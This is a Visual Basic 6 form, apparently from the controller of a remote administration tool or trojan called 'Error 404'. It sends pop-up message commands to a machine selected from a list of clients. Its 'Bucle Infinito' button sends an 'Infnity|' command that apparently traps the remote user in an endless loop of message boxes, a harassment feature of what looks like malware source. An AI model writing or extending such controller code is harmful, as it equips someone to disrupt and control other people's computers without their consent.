VERSION 5.00
Begin VB.Form frmMSG 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Error 404 - Enviar mensaje"
   ClientHeight    =   4185
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   4470
   Icon            =   "frmMSG.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4185
   ScaleWidth      =   4470
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdInfinity 
      Caption         =   "Bucle Infinito"
      Height          =   375
      Left            =   1440
      TabIndex        =   13
      Top             =   3720
      Width           =   1455
   End
   Begin VB.PictureBox pAlert 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   480
      Left            =   1920
      Picture         =   "frmMSG.frx":48FA
      ScaleHeight     =   480
      ScaleWidth      =   480
      TabIndex        =   12
      Top             =   2520
      Width           =   480
   End
   Begin VB.PictureBox pQuestion 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   480
      Left            =   2880
      Picture         =   "frmMSG.frx":593E
      ScaleHeight     =   480
      ScaleWidth      =   480
      TabIndex        =   11
      Top             =   2520
      Width           =   480
   End
   Begin VB.PictureBox pInfo 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   480
      Left            =   3840
      Picture         =   "frmMSG.frx":6982
      ScaleHeight     =   480
      ScaleWidth      =   480
      TabIndex        =   10
      Top             =   2520
      Width           =   480
   End
   Begin VB.PictureBox pCritical 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   480
      Left            =   960
      Picture         =   "frmMSG.frx":79C6
      ScaleHeight     =   480
      ScaleWidth      =   480
      TabIndex        =   9
      Top             =   2520
      Width           =   480
   End
   Begin VB.PictureBox pNone 
      AutoSize        =   -1  'True
      Height          =   540
      Left            =   120
      Picture         =   "frmMSG.frx":8A0A
      ScaleHeight     =   480
      ScaleWidth      =   480
      TabIndex        =   8
      Top             =   2520
      Width           =   540
   End
   Begin VB.CommandButton cmdSend 
      Caption         =   "Enviar"
      Height          =   375
      Left            =   2400
      TabIndex        =   7
      Top             =   3240
      Width           =   1575
   End
   Begin VB.CommandButton cmdTest 
      Caption         =   "Probar"
      Height          =   375
      Left            =   360
      TabIndex        =   6
      Top             =   3240
      Width           =   1575
   End
   Begin VB.Frame fraMSG 
      BackColor       =   &H00FFFFFF&
      Height          =   1575
      Index           =   1
      Left            =   120
      TabIndex        =   3
      Top             =   840
      Width           =   4215
      Begin VB.TextBox txtBody 
         Height          =   1125
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   4
         Top             =   360
         Width           =   3975
      End
      Begin VB.Label lblMSG 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Cuerpo del mensaje"
         Height          =   195
         Index           =   1
         Left            =   1320
         TabIndex        =   5
         Top             =   120
         Width           =   1395
      End
   End
   Begin VB.Frame fraMSG 
      BackColor       =   &H00FFFFFF&
      Height          =   735
      Index           =   0
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4215
      Begin VB.TextBox txtTitle 
         Height          =   285
         Left            =   120
         TabIndex        =   2
         Top             =   360
         Width           =   3975
      End
      Begin VB.Label lblMSG 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Titulo del mensaje"
         Height          =   195
         Index           =   0
         Left            =   1320
         TabIndex        =   1
         Top             =   120
         Width           =   1275
      End
   End
End
Attribute VB_Name = "frmMSG"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdInfinity_Click()
If pNone.BorderStyle = 1 Then Send "Infnity|" & 0 & "|" & txtBody.Text & "|" & txtTitle.Text
If pCritical.BorderStyle = 1 Then Send "Infnity|" & 1 & "|" & txtBody.Text & "|" & txtTitle.Text
If pAlert.BorderStyle = 1 Then Send "Infnity|" & 2 & "|" & txtBody.Text & "|" & txtTitle.Text
If pQuestion.BorderStyle = 1 Then Send "Infnity|" & 3 & "|" & txtBody.Text & "|" & txtTitle.Text
If pInfo.BorderStyle = 1 Then Send "Infnity|" & 4 & "|" & txtBody.Text & "|" & txtTitle.Text
End Sub

Private Sub cmdSend_Click()
If pNone.BorderStyle = 1 Then Send "MSG|" & 0 & "|" & txtBody.Text & "|" & txtTitle.Text
If pCritical.BorderStyle = 1 Then Send "MSG|" & 1 & "|" & txtBody.Text & "|" & txtTitle.Text
If pAlert.BorderStyle = 1 Then Send "MSG|" & 2 & "|" & txtBody.Text & "|" & txtTitle.Text
If pQuestion.BorderStyle = 1 Then Send "MSG|" & 3 & "|" & txtBody.Text & "|" & txtTitle.Text
If pInfo.BorderStyle = 1 Then Send "MSG|" & 4 & "|" & txtBody.Text & "|" & txtTitle.Text
End Sub

Private Sub cmdTest_Click()
If pNone.BorderStyle = 1 Then MsgBox txtBody.Text, , txtTitle.Text
If pCritical.BorderStyle = 1 Then MsgBox txtBody.Text, vbCritical, txtTitle.Text
If pAlert.BorderStyle = 1 Then MsgBox txtBody.Text, vbExclamation, txtTitle.Text
If pQuestion.BorderStyle = 1 Then MsgBox txtBody.Text, vbQuestion, txtTitle.Text
If pInfo.BorderStyle = 1 Then MsgBox txtBody.Text, vbInformation, txtTitle.Text
End Sub

'mmtitle
Private Sub Form_Load()
Me.Caption = "Error 404 - Enviar Mensaje [" & frmMain.LV.SelectedItem & "]"
End Sub

Private Sub pAlert_Click()
pNone.BorderStyle = 0
pCritical.BorderStyle = 0
pAlert.BorderStyle = 1
pQuestion.BorderStyle = 0
pInfo.BorderStyle = 0
End Sub

Private Sub pCritical_Click()
pNone.BorderStyle = 0
pCritical.BorderStyle = 1
pAlert.BorderStyle = 0
pQuestion.BorderStyle = 0
pInfo.BorderStyle = 0
End Sub

Private Sub pInfo_Click()
pNone.BorderStyle = 0
pCritical.BorderStyle = 0
pAlert.BorderStyle = 0
pQuestion.BorderStyle = 0
pInfo.BorderStyle = 1
End Sub

Private Sub pNone_Click()
pNone.BorderStyle = 1
pCritical.BorderStyle = 0
pAlert.BorderStyle = 0
pQuestion.BorderStyle = 0
pInfo.BorderStyle = 0
End Sub

Private Sub pQuestion_Click()
pNone.BorderStyle = 0
pCritical.BorderStyle = 0
pAlert.BorderStyle = 0
pQuestion.BorderStyle = 1
pInfo.BorderStyle = 0
End Sub
